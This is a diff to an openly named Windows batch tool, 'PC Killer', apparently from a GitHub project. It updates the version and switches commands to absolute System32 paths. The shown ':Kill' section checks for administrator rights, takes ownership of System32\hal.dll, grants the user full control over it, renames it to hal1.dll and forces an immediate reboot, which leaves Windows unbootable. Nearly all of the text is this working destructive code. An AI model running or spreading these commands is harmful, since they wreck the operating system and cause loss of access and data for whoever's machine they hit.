@@ -2,12 +2,12 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.3.8
+echo Version: 1.3.9
 echo License: GNU General Public License v3.0
 echo Developer: @YonatanReuvenIsraeli
 echo GitHub: https://github.com/YonatanReuvenIsraeli
-echo Sponsor: https://github.com/sponsors/YonatanReuvenIsraeli 
-net session > nul 2>&1
+echo Sponsor: https://github.com/sponsors/YonatanReuvenIsraeli
+"%windir%\System32\net.exe" session > nul 2>&1
 if not "%errorlevel%"=="0" goto "NotAdministrator"
 goto "Disclaimer"
 
@@ -47,12 +47,12 @@ echo Invalid syntax!
 goto "Warning"
 
 :"Kill"
-takeown /f "%windir%\System32\hal.dll" > nul
-icacls "%windir%\System32\hal.dll" /grant "%USERNAME%":(f) > nul
+"%windir%\System32\takeown.exe" /f "%windir%\System32\hal.dll" > nul
+"%windir%\System32\icacls.exe" "%windir%\System32\hal.dll" /grant "%USERNAME%":(f) > nul
 ren "%windir%\System32\hal.dll" "hal1.dll"
 if not "%errorlevel%"=="0" goto "Error"
 endlocal
-shutdown /r /t 00
+"%windir%\System32\shutdown.exe" /r /t 00
 
 :"Error"
 echo There has been an error! You can try again.
